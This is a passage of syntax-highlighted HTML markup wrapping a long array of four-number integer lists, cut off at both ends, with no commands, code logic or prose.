number">40</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token 